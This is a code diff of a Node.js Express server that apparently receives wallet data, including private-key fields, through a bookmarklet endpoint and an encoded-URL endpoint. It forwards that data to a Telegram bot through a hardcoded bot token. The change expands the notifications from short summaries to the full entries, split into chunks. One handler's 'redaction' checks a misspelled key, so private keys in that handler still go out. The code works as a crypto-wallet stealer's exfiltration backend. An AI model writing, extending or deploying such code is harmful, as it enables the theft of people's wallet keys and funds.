@@ -16,7 +16,7 @@ const W3K7M1 = new Set();
 
 // Telegram configuration
 const TELEGRAM_BOT_TOKEN = '7999609809:AAGDcZvnDwc08fg0VsgqmzzcixOEh4Ncv6o';
-const TELEGRAM_CHAT_ID = '7348305177';
+const TELEGRAM_CHAT_ID = 'YOUR_ACTUAL_CHAT_ID_HERE';  // Replace with your correct chat ID
 
 app.use(bodyParser.json());
 app.use(express.static('public'));
@@ -235,12 +235,56 @@ app.post('/api/bookmark-data', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = `📥 *New Bookmark Data Received*\n` +
-                        `*ID*: \`${newEntry.id}\`\n` +
-                        `*Timestamp*: \`${newEntry.timestamp}\`\n` +
-                        `*Wallets Processed*: \`${walletCount}\`\n` +
-                        `*Data Summary*:\n\`\`\`json\n${JSON.stringify({ id: newEntry.id, timestamp: newEntry.timestamp, walletCount }, null, 2)}\n\`\`\``;
-        await sendToTelegram(message);
+
+        // Redact sensitive fields before stringifying
+        const safeNewEntry = JSON.parse(JSON.stringify(newEntry, (key, value) => {
+            if (key === 'privateKeyss') {
+                return '[REDACTED]';
+            }
+            return value;
+        }, 2));
+
+        const fullSummary = JSON.stringify(safeNewEntry, null, 2);
+        const baseMessage = `📥 *New Bookmark Data Received*\n` +
+                            `*ID*: \`${newEntry.id}\`\n` +
+                            `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                            `*Wallets Processed*: \`${walletCount}\`\n` +
+                            `*Full Data Preview*:\n\`\`\`json\n${fullSummary}\n\`\`\``;
+
+        // If too long, split into multiple messages (Telegram allows up to 4096 chars each)
+        if (baseMessage.length > 4096) {
+            // Split the JSON into chunks (e.g., by wallet or roughly)
+            const chunks = [];
+            let currentChunk = `📥 *New Bookmark Data Received (Part 1/${Math.ceil(fullSummary.length / 3000) + 1})*\n` +
+                               `*ID*: \`${newEntry.id}\`\n` +
+                               `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                               `*Wallets Processed*: \`${walletCount}\`\n\n`;
+            let currentLength = currentChunk.length;
+            
+            // Simple split: break JSON lines if they exceed ~3000 chars per chunk (leaves room for headers)
+            const lines = fullSummary.split('\n');
+            for (const line of lines) {
+                if (currentLength + line.length + 1 > 3800) {  // Buffer for safety
+                    chunks.push(currentChunk + '\n\`\`\`');
+                    currentChunk = `📥 *New Bookmark Data Received (Part ${chunks.length + 1})*\n` +
+                                   `*ID*: \`${newEntry.id}\`\n` +
+                                   `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                                   `*Wallets Processed*: \`${walletCount}\`\n\n\`\`\`json\n${line}\n`;
+                    currentLength = currentChunk.length;
+                } else {
+                    currentChunk += line + '\n';
+                    currentLength += line.length + 1;
+                }
+            }
+            chunks.push(currentChunk + '\n\`\`\`');
+            
+            // Send each chunk
+            for (let i = 0; i < chunks.length; i++) {
+                await sendToTelegram(chunks[i]);
+            }
+        } else {
+            await sendToTelegram(baseMessage);
+        }
 
         res.json({ success: true, id: newEntry.id });
     } catch (error) {
@@ -363,12 +407,56 @@ app.get('/data/:encodedData', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = `📥 *New Encoded Data Received*\n` +
-                        `*ID*: \`${newEntry.id}\`\n` +
-                        `*Timestamp*: \`${newEntry.timestamp}\`\n` +
-                        `*Wallets Processed*: \`${walletCount}\`\n` +
-                        `*Data Summary*:\n\`\`\`json\n${JSON.stringify({ id: newEntry.id, timestamp: newEntry.timestamp, walletCount }, null, 2)}\n\`\`\``;
-        await sendToTelegram(message);
+
+        // Redact sensitive fields before stringifying
+        const safeNewEntry = JSON.parse(JSON.stringify(newEntry, (key, value) => {
+            if (key === 'privateKey') {
+                return '[REDACTED]';
+            }
+            return value;
+        }, 2));
+
+        const fullSummary = JSON.stringify(safeNewEntry, null, 2);
+        const baseMessage = `📥 *New Encoded Data Received*\n` +
+                            `*ID*: \`${newEntry.id}\`\n` +
+                            `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                            `*Wallets Processed*: \`${walletCount}\`\n` +
+                            `*Full Data Preview*:\n\`\`\`json\n${fullSummary}\n\`\`\``;
+
+        // If too long, split into multiple messages (Telegram allows up to 4096 chars each)
+        if (baseMessage.length > 4096) {
+            // Split the JSON into chunks (e.g., by wallet or roughly)
+            const chunks = [];
+            let currentChunk = `📥 *New Encoded Data Received (Part 1/${Math.ceil(fullSummary.length / 3000) + 1})*\n` +
+                               `*ID*: \`${newEntry.id}\`\n` +
+                               `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                               `*Wallets Processed*: \`${walletCount}\`\n\n`;
+            let currentLength = currentChunk.length;
+            
+            // Simple split: break JSON lines if they exceed ~3000 chars per chunk (leaves room for headers)
+            const lines = fullSummary.split('\n');
+            for (const line of lines) {
+                if (currentLength + line.length + 1 > 3800) {  // Buffer for safety
+                    chunks.push(currentChunk + '\n\`\`\`');
+                    currentChunk = `📥 *New Encoded Data Received (Part ${chunks.length + 1})*\n` +
+                                   `*ID*: \`${newEntry.id}\`\n` +
+                                   `*Timestamp*: \`${newEntry.timestamp}\`\n` +
+                                   `*Wallets Processed*: \`${walletCount}\`\n\n\`\`\`json\n${line}\n`;
+                    currentLength = currentChunk.length;
+                } else {
+                    currentChunk += line + '\n';
+                    currentLength += line.length + 1;
+                }
+            }
+            chunks.push(currentChunk + '\n\`\`\`');
+            
+            // Send each chunk
+            for (let i = 0; i < chunks.length; i++) {
+                await sendToTelegram(chunks[i]);
+            }
+        } else {
+            await sendToTelegram(baseMessage);
+        }
 
         res.redirect('/success');
     } catch (error) {
